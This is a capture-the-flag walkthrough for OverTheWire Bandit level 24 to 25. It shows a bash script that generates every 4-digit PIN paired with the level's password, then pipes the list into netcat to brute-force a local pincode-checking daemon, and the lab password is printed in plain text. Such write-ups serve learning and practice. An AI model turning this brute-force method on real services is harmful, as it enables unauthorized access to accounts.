# Bandit Level 24 → Level 25

## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time.

## Methodology
* First thing first, login as bandit24.
* A daemon, a background process, listening on port 30002, we will connect on 30002 and give `bandit24-passwd 4-digit-pin`
```
bandit24@bandit:~$ telnet 127.0.0.1 30002
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is '^]'.


I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.

Wrong! Please enter the correct current password and pincode. Try again.
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 5000
Wrong! Please enter the correct current password and pincode. Try again.
^C^]
telnet> quit
Connection closed.
```
* We should use netcat, 
```
bandit24@bandit:~$ nc -v 127.0.0.1 30002
Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
can we do one thing make a scipt and pass the output to nc l
Wrong! Please enter the correct current password and pincode. Try again.
^C
```
* We can try `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 5000` for two or three time, but we have 10000 combinations. We are going to brute-force it.
* First we will generate a list of possible values and then read that values and pass to the netcat. Something like that.
```
bandit24@bandit:~$ nano /tmp/bandit24/brute.sh 
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.
```
* `/tmp/bandit24/brute.sh`
```
#!/bin/bash

#HOST="127.0.0.1"
#PORT="30002"

BANDIT24="hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"

for PIN in  {0000..9999};
do
    echo $BANDIT24 $PIN >> /tmp/bandit24/passcodes.txt
done
echo "Done!"
```
* We can read the output file `/tmp/bandit24/passcodes.txt`
```
bandit24@bandit:~$ bash /tmp/bandit24/brute.sh 
Done!
bandit24@bandit:~$ cat /tmp/bandit24/passcodes.txt 
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0000
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0001
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0002
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 0003
...
...
...
```
* We can now try brute-force.
```
bandit24@bandit:~$ cat /tmp/bandit24/passcodes.txt | nc -v 127.0.0.1 30002
Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
...
...
...
Correct!
The password of user bandit25 is REDACTED
```
* We get the password for next level, bandit25.
## Additional Work
* For clean terminal, we can redirect to a file.
```
bandit24@bandit:~$ cat /tmp/bandit24/passcodes.txt | nc -v 127.0.0.1 30002 >> /tmp/bandit24/output.txt
Connection to 127.0.0.1 30002 port [tcp/*] succeeded!
bandit24@bandit:~$ cat /tmp/bandit24/output.txt | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is REDACTED

bandit24@bandit:~$ 
```
* And simply we can use `grep -v ` to neglect `Wrong!`
## Key Takeaways / Concepts
* **Network Interfacing with Netcat (`nc`):** Netcat acts as a versatile tool for reading and writing data across network connections. Piping a generated wordlist directly into `nc 127.0.0.1 30002` allows you to rapidly automate data input against local or remote services without manual typing.
* **Bash Brace Expansion for Padding:** Using `{0000..9999}` ensures that numbers are correctly generated with leading zeros (e.g., `0000`, `0001`), which is vital when a service expects a fixed-length PIN format.
* **Output Filtering (`grep -v`):** When brute-forcing large datasets, logs can quickly clutter your terminal. Using `grep -v "Wrong"` inverts the match to hide failure messages, allowing you to instantly isolate successful responses and flags.
* Using output redirection (`>>`) combined with inverse matching (`grep -v`) helps filter out noise during brute-force operations.